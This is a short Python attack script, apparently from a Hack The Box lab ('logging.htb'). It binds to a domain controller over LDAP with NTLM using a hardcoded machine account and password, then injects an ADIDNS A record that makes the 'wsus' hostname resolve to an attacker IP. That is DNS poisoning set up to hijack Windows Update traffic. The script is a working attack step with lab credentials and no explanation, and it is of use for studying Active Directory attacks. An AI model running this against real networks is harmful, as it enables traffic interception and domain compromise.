import ldap3, struct

ATTACKER_IP = '10.10.16.13'
ip = bytes(int(x) for x in ATTACKER_IP.split('.'))
# DNS_RPC_RECORD_A: DataLen(2) Type(2) Ver(1) Rank(1) Flags(2) Serial(4) Ttl(4) Reserved(4) TimeStamp(4) Data(4)
record = struct.pack('<HHBBHIIII', 4, 1, 5, 0xF0, 0, 1, 180, 0, 0) + ip

s = ldap3.Server('10.129.30.59', port=389)
c = ldap3.Connection(s, user='logging.htb\\zhaha01$', password='@Zhaha12345',
                     authentication=ldap3.NTLM, auto_bind=True)
c.add('DC=wsus,DC=logging.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=logging,DC=htb',
      ['top', 'dnsNode'],
      {'dnsRecord': [record], 'dnsTombstoned': 'FALSE'})
print(c.result)
